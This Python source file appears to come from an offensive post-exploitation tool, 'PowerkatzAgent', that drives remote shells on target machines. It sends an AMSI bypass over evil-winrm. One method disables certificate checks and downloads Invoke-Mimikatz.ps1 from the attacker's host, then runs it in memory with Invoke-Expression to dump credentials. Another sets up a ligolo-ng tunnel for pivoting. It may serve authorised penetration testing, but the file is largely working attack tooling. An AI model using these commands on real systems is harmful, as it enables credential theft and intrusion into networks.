from flask import current_app
from ptyprocess import PtyProcess
from select import select
from uuid import uuid4
from threading import Thread
from time import sleep
from re import compile, IGNORECASE, findall, S

class PowerkatzAgent:
    def __init__(self):
        self.agents = dict()
        self.agentId = str()
        self.tunnelingProxy = dict()
        self.tunnelingAgents = dict()
        self.tunnelingAgentId = int()
        self.SH_SHELL_COMMAND = ['sh']

    def getAllAgents(self):
        return self.agents

    def getAllAgentsInformation(self):
        allAgents = dict()
        for agentId, agentValue in self.agents.items():
            allAgents[agentId] = dict()
            allAgents[agentId]['user'] = agentValue['user']
            allAgents[agentId]['targetIpAddress'] = agentValue['targetIpAddress']
            allAgents[agentId]['isMimikatzSetup'] = agentValue['isMimikatzSetup']

        return allAgents

    def getAgentById(self, agentId):
        return self.agents[agentId]

    def getAllTunnelingAgents(self):
        return self.tunnelingAgents

    def getTunnelingAgentById(self, tunnelingAgentId):
        return self.tunnelingAgents[tunnelingAgentId]

    def getTunnelingProxyExecutedCommands(self):
        # wait for the reader thread
        sleep(1)

        executedCommands = str()
        for commannd in self.tunnelingProxy['executedCommands']:
            executedCommands += commannd

        return executedCommands

    def getAgentExecutedCommands(self, agentId):
        # wait for the reader thread
        sleep(1)

        executedCommands = str()
        for commannd in self.agents[agentId]['executedCommands']:
            executedCommands += commannd

        return executedCommands

    def getAgentExecutedMimikatzCommands(self, agentId, command):
        # wait for the reader thread
        sleep(5)
        # for _ in range(10):
        #     if 'PS ' in self.agents[agentId]['executedCommands'][-1]:
        #         break

        #     sleep(1)

        executedCommands = str()
        for executedCommand in self.agents[agentId]['executedCommands']:
            executedCommands += executedCommand

        # we only get the last executed Mimikatz command result
        filteredExecutedCommands = findall(r'Invoke-Mimikatz\s.*?PS\s', executedCommands, S)[-1]
        return filteredExecutedCommands

    def createNewAgent(self, user, targetIpAddress, payloadExecutableFilename=str()):
        agentUuid = uuid4().hex
        self.agentId = agentUuid
        self.agents[self.agentId] = dict()

        newAgentProcess = PtyProcess.spawn(self.SH_SHELL_COMMAND)
        self.agents[self.agentId]['agentProcess'] = newAgentProcess

        self.agents[self.agentId]['user'] = user
        self.agents[self.agentId]['targetIpAddress'] = targetIpAddress
        self.agents[self.agentId]['payloadExecutableFilename'] = payloadExecutableFilename
        self.agents[self.agentId]['isMimikatzSetup'] = False
        self.agents[self.agentId]['executedCommands'] = list()
        
        return self.agentId

    def startOutputReaderThread(self, agent):
        # create a new thread (Never closes) that keeps reading agent's executed commands every second
        def outputReader():
            READ_OUTPUT_TIMEOUT = 1
            agentProcess = agent['agentProcess']
            try:
                while True:
                    ready, _, _ = select([agentProcess.fd], [], [], READ_OUTPUT_TIMEOUT)
                    if agentProcess.fd in ready:
                        data = agentProcess.read().decode()
                        agent['executedCommands'].append(data)
            except EOFError:
                pass

        thread = Thread(target=outputReader)
        thread.start()

    def executeCommandOnAgentProcess(self, agentId, command):
        agent = self.getAgentById(agentId)

        executeCommand = command.encode('utf-8') + b'\n'
        agentProcess = agent['agentProcess']
        agentProcess.write(executeCommand)

        output = self.getAgentExecutedCommands(agentId)
        return output

    def executeMimikatzCommandOnAgentProcess(self, agentId, command):
        agent = self.getAgentById(agentId)
        originalExecutedCommands = agent['executedCommands']

        executeCommand = command.encode('utf-8') + b'\n'
        agentProcess = agent['agentProcess']
        agentProcess.write(executeCommand)

        output = self.getAgentExecutedMimikatzCommands(agentId, executeCommand)
        return output

    def terminateAgentProcess(self, agentProcess):
        agentProcess.terminate()

    def removeAgent(self, agentId):
        agent = self.getAgentById(agentId)
        agentProcess = agent['agentProcess']
        self.terminateAgentProcess(agentProcess)

        del self.agents[agentId]

    def setupMimikatz(self, agentId, commandProgram):
        agent = self.getAgentById(agentId)

        # TODO: load Invoke-Mimikatz into memory after the agent was created
        if commandProgram == 'impacket-psexec':
            pass
        elif commandProgram == 'impacket-smbexec':
            pass
        elif commandProgram == 'evil-winrm':
            command = 'Bypass-4MSI'
            self.executeCommandOnAgentProcess(agentId, command)
            command = 'Invoke-Mimikatz.ps1'
            self.executeCommandOnAgentProcess(agentId, command)
        elif commandProgram == 'impacket-wmiexec':
            pass

        agent['isMimikatzSetup'] = True

    def agentLoadMimikatz(self, agentId):
        agent = self.getAgentById(agentId)
        attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']

        ignoreSSLCommand = "Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;"
        loadMimikatzToMemoryCommand = f"Invoke-Expression (New-Object System.Net.Webclient).DownloadString('https://{attackerIpAddress}/static/transferFiles/Invoke-Mimikatz.ps1')"
        command = ignoreSSLCommand + loadMimikatzToMemoryCommand
        self.executeCommandOnAgentProcess(agentId, command)

        agent['isMimikatzSetup'] = True

    def startTunnelingProxyOutputReaderThread(self):
        # create a new thread (Never closes) that keeps reading tunneling proxy process executed commands every second
        def tunnelingProxyProcessOutputReader():
            READ_OUTPUT_TIMEOUT = 1
            tunnelingProxyProcess = self.tunnelingProxy['process']
            try:
                while True:
                    ready, _, _ = select([tunnelingProxyProcess.fd], [], [], READ_OUTPUT_TIMEOUT)
                    if tunnelingProxyProcess.fd in ready:
                        data = tunnelingProxyProcess.read().decode()

                        # we don't want ANSI colored output, cuz it looks messy in the terminal
                        # from https://ask.replit.com/t/how-to-convert-colored-text-to-plain-text-with-termcolor/97028/2
                        ansiEscape = compile(r'\x1B\[[0-?]*[ -/]*[@-~]', IGNORECASE)
                        result = ansiEscape.sub('', data)

                        self.tunnelingProxy['executedCommands'].append(result)
            except EOFError:
                pass

        thread = Thread(target=tunnelingProxyProcessOutputReader)
        thread.start()

    def executeCommandOnTunnelingProxyProcess(self, command):
        executeCommand = command.encode('utf-8') + b'\n'
        self.tunnelingProxy['process'].write(executeCommand)

        output = self.getTunnelingProxyExecutedCommands()
        return output

    def createNewTunnelingProxyProcess(self):
        newTunnelingProxyProcess = PtyProcess.spawn(self.SH_SHELL_COMMAND)
        self.tunnelingProxy['process'] = newTunnelingProxyProcess
        self.tunnelingProxy['executedCommands'] = list()

        self.startTunnelingProxyOutputReaderThread()

        command = './src/core/static/transferFiles/ligolo-ng/ligolo-ng_proxy -selfcert'
        output = self.executeCommandOnTunnelingProxyProcess(command)

    def createNewProxyAgent(self, targetIpAddress):
        self.tunnelingAgentId += 1
        self.tunnelingAgents[self.tunnelingAgentId] = dict()
        self.tunnelingAgents[self.tunnelingAgentId]['targetIpAddress'] = targetIpAddress
        
        return self.tunnelingAgentId

    def startProxy(self, tunnelingAgentId):
        command = 'session'
        self.executeCommandOnTunnelingProxyProcess(command)
        command = str(tunnelingAgentId)
        self.executeCommandOnTunnelingProxyProcess(command)
        command = 'start'
        self.executeCommandOnTunnelingProxyProcess(command)

    def stopProxy(self):
        self.tunnelingAgentId = 0
        self.tunnelingAgents = dict()

        self.tunnelingProxy['executedCommands'] = list()
        self.tunnelingProxy['process'].terminate()